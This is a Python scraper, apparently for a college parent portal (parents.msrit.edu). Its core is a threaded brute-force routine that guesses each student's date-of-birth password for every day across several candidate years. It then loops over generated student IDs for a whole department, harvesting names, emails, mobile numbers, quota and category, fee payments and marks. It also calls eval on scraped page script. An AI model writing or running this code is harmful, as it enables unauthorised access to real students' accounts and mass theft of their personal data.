from typing import Union
from threading import Thread

from scraper import Scraper, get_cache, set_cache, cached, roll_range, gen_usn

CACHE_NAME = "siscacheri92gh45"


def gen_payload() -> dict[str, str]:
	return {
		"username": "",
		"dd": "",
		"mm": "",
		"yyyy": "",
		"passwd": "",
		"remember": "",
		"option": "com_user",
		"task": "login",
		"return": "",
		"ea07d18ec2752bcca07e20a852d96337": "1"
	}


class SisScraper(Scraper):
	URL = "https://parents.msrit.edu/"
	MARKS_CURL = "index.php?option=com_studentdashboard&controller=studentdashboard&task=dashboard"

	def __exit__(self, exc_type, exc_val, exc_tb):
		set_cache(CACHE_NAME, self.brute_year)
		super(SisScraper, self).__exit__(exc_type, exc_val, exc_tb)

	def get_logged_body(self, payload):
		soup = self.get_soup(self.URL, "POST", payload)
		body = soup.body
		if body.find(id="username") is None: return body

	def get_curl_body(self, curl):
		soup = self.get_soup(self.URL + curl)
		body = soup.body
		if body.find(id="username") is None: return body

	def get_meta(self, payload) -> dict[str, str]:
		body = self.get_logged_body(payload)
		if body is None: return {}
		td = body.find_all("td")
		trs = body.find_all("tbody")[1].find_all("tr")
		return {
			"name": td[0].text.split(":")[1].strip(),
			"usn": payload["username"],
			"dob": payload["passwd"],
			"email": td[1].text.split(":")[1].strip(),
			"sem": td[2].text.split(":")[1].strip(),
			"quota": td[4].text.split(":")[1].strip(),
			"mobile": td[5].text.split(":")[1].strip(),
			"course": td[6].text.split(":")[1].strip(),
			"category": td[8].text.split(":")[1].strip(),
			"class": body.find_all("p")[6].text.strip(),
			"batch": td[9].text.split(":")[1].strip(),
			"paid": [tr.find_all("td")[3].text.strip() for tr in trs]
		}

	def __mark_worker(self, curl, marks: dict):
		table = self.get_curl_body(curl).table
		sub, code = table.find("caption").text.strip().replace(")", "").split("( ")
		mark = [t.text.replace("Abscent", "0/0").split('/') if t.text != "-" else None for t in table.find_all("td")]
		marks[code] = {
			"sub": sub,
			"attd": int(mark.pop(-2)[0].removesuffix("%")),
			"cies": [tuple(map(int, m)) for m in mark[:4] if m is not None],
			"ces": [tuple(map(int, m)) for m in mark[4:7] if m is not None],
			"tot": tuple(map(int, mark[7])),
		}

	def get_marks(self, lite=False) -> dict[str, Union[dict, tuple]]:
		body = self.get_curl_body(self.MARKS_CURL)
		if body is None: return {}
		subs = body.find("tbody").find_all("tr")
		if lite:
			chart = body.find_all("script")[4].text
			marks = dict(eval(chart[chart.find("["):chart.rfind("]") + 1]))
			for (key, val), sub in zip(marks.items(), subs):
				marks[key] = (sub.text.split("\n")[2], int(sub.find_all("button")[-2].text), val)
			return marks
		marks = {}
		workers = []
		for s in subs:
			worker = Thread(target=self.__mark_worker, args=(s.find_all("a")[-1].get("href"), marks))
			worker.start()
			workers.append(worker)
		for worker in workers: worker.join()
		return marks

	def brute_month(self, usn: str, year: int, month: int, *, _INTERNAL_THREAD_USE: list = None) -> Union[
		str, None, bool]:
		assert isinstance(_INTERNAL_THREAD_USE, list) or _INTERNAL_THREAD_USE is None
		payload = gen_payload()
		for day in range(1, 32):
			if _INTERNAL_THREAD_USE is not None and any(_INTERNAL_THREAD_USE): return
			payload['username'] = usn.lower()
			payload['passwd'] = f"{year}-{month:02}-{day:02}"
			try:
				body = self.get_logged_body(payload)
			except Exception as e:
				print(e)
				if _INTERNAL_THREAD_USE is not None: _INTERNAL_THREAD_USE.append(None)
				return
			if body is not None:
				if _INTERNAL_THREAD_USE is not None: _INTERNAL_THREAD_USE.append(payload['passwd'])
				return payload['passwd']
		_INTERNAL_THREAD_USE.append(False)
		return False

	@cached(get_cache(CACHE_NAME))
	def brute_year(self, *, usn: str, year: int) -> Union[str, None, bool]:
		workers = []
		dob = []
		for month in range(1, 13):
			worker = Thread(target=self.brute_month, args=(usn, year, month), kwargs={"_INTERNAL_THREAD_USE": dob})
			worker.start()
			workers.append(worker)
		for worker in workers: worker.join()
		all_false = True
		for d in dob:
			if d: return d
			if d is None: all_false = False
		if all_false: return False

	def get_dob(self, usn) -> Union[str, None]:
		join_year = int("20" + usn[3:5])
		for year in [y := join_year - 18, y - 1, y + 1, y - 2, y - 3]:
			if dob := self.brute_year(usn=usn, year=year): return dob

	def stats_dept(self, year: int, dept: str, start: int = 1, stop: int = None, temp: bool = False,
				   dobs: dict[int, str] = None,
				   lite: bool = False):
		if dobs is None: dobs = {}
		pl = gen_payload()
		tol = 4
		for i in roll_range(start, stop):
			if tol <= 0: return
			pl["username"] = gen_usn(year, dept, i, temp)

			# === dob worker
			if i not in dobs:
				dob = self.get_dob(pl['username'])
			else:
				dob = dobs[i]
			if dob is None:
				tol -= 1
				continue
			tol = 4
			if i % 5 == 0: set_cache(CACHE_NAME, self.brute_year)

			# === meta worker
			pl["passwd"] = dob
			meta = self.get_meta(pl)

			# === marks worker
			marks = self.get_marks(lite)

			yield meta, marks


# todo: macro
# todo: attendance


def micro(year: int, dept: str, i: int, temp: bool = False, dob: str = None, lite: bool = False):
	with SisScraper() as SIS:
		pl = gen_payload()
		pl['username'] = gen_usn(year, dept, i, temp)

		# === dob worker
		if dob is None: dob = SIS.get_dob(pl['username'])
		if dob is None: return {}

		# === meta worker
		pl["passwd"] = dob
		meta = SIS.get_meta(pl)

		# === marks worker
		marks = SIS.get_marks(lite)

		return meta, marks
